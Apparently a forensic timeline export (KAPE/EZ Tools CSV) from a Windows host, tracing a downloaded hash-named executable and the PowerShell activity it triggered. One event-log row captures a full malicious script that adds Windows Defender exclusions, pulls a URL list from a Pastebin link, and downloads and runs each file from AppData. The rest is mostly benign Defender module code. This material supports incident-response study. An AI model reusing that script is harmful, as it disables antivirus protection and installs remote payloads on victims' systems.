DateTime,TimestampInfo,ArtifactName,Tool,Description,DataDetails,DataPath,FileExtension,EventId,User,Computer,FileSize,IPAddress,SourceAddress,DestinationAddress,SHA1,Count,EvidencePath,RawData
2025-05-03T03:51:14.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,CopyPaste,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,End Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,CopyPaste,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,CopyPaste,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,CopyPaste,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:40:31.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,End Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-02T00:10:43.0000000,Duration,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:00:57.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:00:57.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:00:57.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:14.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:17.0000000,End Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-02T00:00:03.0000000,Duration,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:17.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:17.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:17.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:19.0000000,End Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-02T00:00:02.0000000,Duration,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:19.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:19.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:22.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:24.0000000,End Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-02T00:00:02.0000000,Duration,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:24.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:24.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:25.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,System32/WindowsPowerShell/v1.0/powershell.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:25.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,System32/WindowsPowerShell/v1.0/powershell.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:25.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,System32/WindowsPowerShell/v1.0/powershell.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:26.1735938,Last Write,Amcache,EZ Tools,Program Execution,Unassociated,c:/users/admin0x/downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,.exe,,,,36352,,,,c5efefddfd4d83486f58e18edb7d4139e13b9e0c,,ProgramExecution/20250502233755_Amcache_UnassociatedFileEntries.csv,
2025-05-03T03:47:03.0172243,Last Write,Amcache,EZ Tools,Program Execution,Unassociated,c:/windows/system32/devicecensus.exe,.exe,,,,58704,,,,4817d7039b5b983b6c115fa6a6f16a71fe59fafd,,ProgramExecution/20250502233755_Amcache_UnassociatedFileEntries.csv,
2025-05-03T04:36:03.6835142,Last Write,Amcache,EZ Tools,Program Execution,Unassociated,,,,,,,,,,,,ProgramExecution/20250502233755_Amcache_UnassociatedFileEntries.csv,
2025-05-03T04:00:59.5143829,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: # Start a hidden PowerShell process to display a message box, Start-Process powershell -WindowStyle Hidden -ArgumentList @', Add-Type -AssemblyName System.Windows.Forms;, [System.Windows.Forms.MessageBox]::Show('', '', 'OK', 'Error');, '@, # Add exclusions to Windows Defender, Add-MpPreference -ExclusionPath @($env:UserProfile, $env:SystemDrive) -Force, # Download files from a Pastebin URL and execute them, $wc = New-Object System.Net.WebClient, $lnk = $wc.DownloadString('https://pastebin.com/raw/RhwXFFwF') -split '`r`n', # Generate a random file name prefix, $fn = [System.IO.Path]::GetRandomFileName(), # Download and execute each file, for ($i = 0; $i -lt $lnk.Length; $i++) {,     $filePath = Join-Path -Path $env:AppData -ChildPath ($fn + $i.ToString() + '.exe'),     $wc.DownloadFile($lnk[$i], $filePath),     Start-Process -FilePath $filePath, }",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:01.8203298,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: , #requires -version 3.0, try { Microsoft.PowerShell.Core/Set-StrictMode -Off } catch { }, $script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module, $script:ClassName = 'ROOT/Microsoft/Windows/Defender/MSFT_MpComputerStatus', $script:ClassVersion = '', $script:ModuleVersion = '1.0', $script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter], $script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new(), Microsoft.PowerShell.Core/Export-ModuleMember -Function @(),         , function __cmdletization_BindCommonParameters, {,     param(,         $__cmdletization_objectModelWrapper,,         $myPSBoundParameters,     )       ,                 ,         if ($myPSBoundParameters.ContainsKey('CimSession')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('AsJob')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] ,         },                     , },                 , function Get-MpComputerStatus, {,     [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)],     ,     [OutputType([Microsoft.Management.Infrastructure.CimInstance])], [OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/Microsoft/Windows/Defender/MSFT_MpComputerStatus')],     param(,     ,     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [int],     ${ThrottleLimit},,     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,     $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder(),     $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpComputerStatus.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Get-MpComputerStatus' -Alias '*',         ,",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0546381,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: , #requires -version 3.0, try { Microsoft.PowerShell.Core/Set-StrictMode -Off } catch { }, $script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module, $script:ClassName = 'root/Microsoft/Windows/Defender/MSFT_MpPreference', $script:ClassVersion = '1.0', $script:ModuleVersion = '1.0', $script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter], $script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new(), Microsoft.PowerShell.Core/Export-ModuleMember -Function @(),         , function __cmdletization_BindCommonParameters, {,     param(,         $__cmdletization_objectModelWrapper,,         $myPSBoundParameters,     )       ,                 ,         if ($myPSBoundParameters.ContainsKey('CimSession')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('AsJob')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] ,         },                     , },                 , function Set-MpPreference, {,     [CmdletBinding(PositionalBinding=$false)],     ,     ,     param(,     ,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionPath},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionExtension},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionProcess},,     [Parameter(ParameterSetName='Set0')],     [Alias('rtsd')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Both','Incoming','Outcoming')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection],     ${RealTimeScanDirection},,     [Parameter(ParameterSetName='Set0')],     [Alias('qpiad')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${QuarantinePurgeItemsAfterDelay},,     [Parameter(ParameterSetName='Set0')],     [Alias('rsd')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day],     ${RemediationScheduleDay},,     [Parameter(ParameterSetName='Set0')],     [Alias('rst')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [datetime],     ${RemediationScheduleTime},,     [Parameter(ParameterSetName='Set0')],     [Alias('raat')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${ReportingAdditionalActionTimeOut},,     [Parameter(ParameterSetName='Set0')],     [Alias('rcto')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${ReportingCriticalFailureTimeOut},,     [Parameter(ParameterSetName='Set0')],     [Alias('rncto')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${ReportingNonCriticalTimeOut},,     [Parameter(ParameterSetName='Set0')],     [Alias('saclf')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [byte],     ${ScanAvgCPULoadFactor},,     [Parameter(ParameterSetName='Set0')],     [Alias('csbr')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${CheckForSignaturesBeforeRunningScan},,     [Parameter(ParameterSetName='Set0')],     [Alias('spiad')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${ScanPurgeItemsAfterDelay},,     [Parameter(ParameterSetName='Set0')],     [Alias('soiie')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${ScanOnlyIfIdleEnabled},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('QuickScan','FullScan')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType],     ${ScanParameters},,     [Parameter(ParameterSetName='Set0')],     [Alias('scsd')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day],     ${ScanScheduleDay},,     [Parameter(ParameterSetName='Set0')],     [Alias('scsqst')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [datetime],     ${ScanScheduleQuickScanTime},,     [Parameter(ParameterSetName='Set0')],     [Alias('scst')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [datetime],     ${ScanScheduleTime},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigfagp')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${SignatureFirstAuGracePeriod},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigagp')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${SignatureAuGracePeriod},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigdufss')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string],     ${SignatureDefinitionUpdateFileSharesSources},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigduoswo')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${SignatureDisableUpdateOnStartupWithoutEngine},,     [Parameter(ParameterSetName='Set0')],     [Alias('sfo')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string],     ${SignatureFallbackOrder},,     [Parameter(ParameterSetName='Set0')],     [Alias('ssp','SecurityIntelligenceLocation','ssl')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string],     ${SharedSignaturesPath},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigsd')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day],     ${SignatureScheduleDay},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigst')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [datetime],     ${SignatureScheduleTime},,     [Parameter(ParameterSetName='Set0')],     [Alias('siguci')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${SignatureUpdateCatchupInterval},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigui')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${SignatureUpdateInterval},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Disabled','Basic','Advanced')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType],     ${MAPSReporting},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('AlwaysPrompt','SendSafeSamples','NeverSend','SendAllSamples')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType],     ${SubmitSamplesConsent},,     [Parameter(ParameterSetName='Set0')],     [Alias('dae')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableAutoExclusions},,     [Parameter(ParameterSetName='Set0')],     [Alias('dpm')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisablePrivacyMode},,     [Parameter(ParameterSetName='Set0')],     [Alias('rstt')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${RandomizeScheduleTaskTimes},,     [Parameter(ParameterSetName='Set0')],     [Alias('dbm')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableBehaviorMonitoring},,     [Parameter(ParameterSetName='Set0')],     [Alias('dips')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableIntrusionPreventionSystem},,     [Parameter(ParameterSetName='Set0')],     [Alias('dioavp')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableIOAVProtection},,     [Parameter(ParameterSetName='Set0')],     [Alias('drtm')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableRealtimeMonitoring},,     [Parameter(ParameterSetName='Set0')],     [Alias('dscrptsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableScriptScanning},,     [Parameter(ParameterSetName='Set0')],     [Alias('darchsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableArchiveScanning},,     [Parameter(ParameterSetName='Set0')],     [Alias('dcfsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableCatchupFullScan},,     [Parameter(ParameterSetName='Set0')],     [Alias('dcqsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableCatchupQuickScan},,     [Parameter(ParameterSetName='Set0')],     [Alias('demsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableEmailScanning},,     [Parameter(ParameterSetName='Set0')],     [Alias('drdsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableRemovableDriveScanning},,     [Parameter(ParameterSetName='Set0')],     [Alias('drp')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableRestorePoint},,     [Parameter(ParameterSetName='Set0')],     [Alias('dsmndfsc')],     [ValidateNotNul...[truncated]",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0546506,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: tdefac')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction],     ${ModerateThreatDefaultAction},,     [Parameter(ParameterSetName='Set0')],     [Alias('htdefac')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction],     ${HighThreatDefaultAction},,     [Parameter(ParameterSetName='Set0')],     [Alias('stdefac')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction],     ${SevereThreatDefaultAction},,     [Parameter(ParameterSetName='Set0')],     [switch],     ${Force},,     [Parameter(ParameterSetName='Set0')],     [Alias('dbaf')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableBlockAtFirstSeen},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Disabled','Enabled','AuditMode')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType],     ${PUAProtection},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Default','Moderate','High','HighPlus','ZeroTolerance')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType],     ${CloudBlockLevel},,     [Parameter(ParameterSetName='Set0')],     [Alias('cloudextimeout')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${CloudExtendedTimeout},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Disabled','Enabled','AuditMode')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType],     ${EnableNetworkProtection},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Disabled','Enabled','AuditMode','BlockDiskModificationOnly','AuditDiskModificationOnly')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType],     ${EnableControlledFolderAccess},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${AttackSurfaceReductionOnlyExclusions},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ControlledFolderAccessAllowedApplications},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ControlledFolderAccessProtectedFolders},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${AttackSurfaceReductionRules_Ids},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]],     ${AttackSurfaceReductionRules_Actions},,     [Parameter(ParameterSetName='Set0')],     [Alias('elcp')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${EnableLowCpuPriority},,     [Parameter(ParameterSetName='Set0')],     [Alias('efhc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${EnableFileHashComputation},,     [Parameter(ParameterSetName='Set0')],     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [Parameter(ParameterSetName='Set0')],     [int],     ${ThrottleLimit},,     [Parameter(ParameterSetName='Set0')],     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = 